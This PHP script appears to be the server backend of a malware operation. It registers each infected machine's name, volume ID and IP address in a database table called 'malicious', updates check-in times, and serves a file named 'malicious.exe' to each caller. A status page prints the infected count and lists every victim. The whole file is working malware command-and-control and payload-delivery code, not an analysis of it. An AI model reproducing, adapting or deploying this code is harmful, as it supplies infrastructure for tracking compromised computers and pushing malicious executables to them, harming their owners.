<?php
// Wow. My eyes.
$mysqli = new mysqli('127.0.0.1', 'root', '', 'malicious');

if (mysqli_connect_errno()) {
  printf("Connect failed: %s\n", mysqli_connect_error());
  exit();
}

// Checking if new infected
if (isset($_REQUEST['id']) && isset($_REQUEST['name']))
{
  $stmt = $mysqli->prepare('SELECT * FROM malicious WHERE name = ? and volumeid = ?');

  $stmt->bind_param('si', $_REQUEST['name'], $_REQUEST['id']);
  $stmt->execute();
  $results = $stmt->get_result();

  $date = date('Y-m-d H:i:s');
  if ($results->num_rows == 0)
  {
    $stmt = $mysqli->prepare("INSERT INTO malicious (name, ip, volumeid, firstupdate, lastupdate) VALUES (?, ?, ?, ?, ?)");
    $stmt->bind_param('ssiss', $_REQUEST['name'], $_SERVER['REMOTE_ADDR'], $_REQUEST['id'], $date, $date);
  }
  else
  {
    $stmt = $mysqli->prepare("UPDATE malicious SET lastupdate = now(), ip = ? WHERE name = ? and volumeid = ?");
    $stmt->bind_param('ssi', $_SERVER['REMOTE_ADDR'], $_REQUEST['name'], $_REQUEST['id']);
  }
  $stmt->execute();

  $results->free();

  echo file_get_contents("malicious.exe");

  return ;
}

$results = $mysqli->query("SELECT * FROM malicious");

echo "INFETECTED: " . $results->num_rows . "<br>";
while($infected = $results->fetch_assoc()) {
  echo $infected['name'] . " / " . $infected['volumeid'] . " - " . $infected['lastupdate'] ;
  echo "<br>";
}

$results->free();
$mysqli->close();
?>
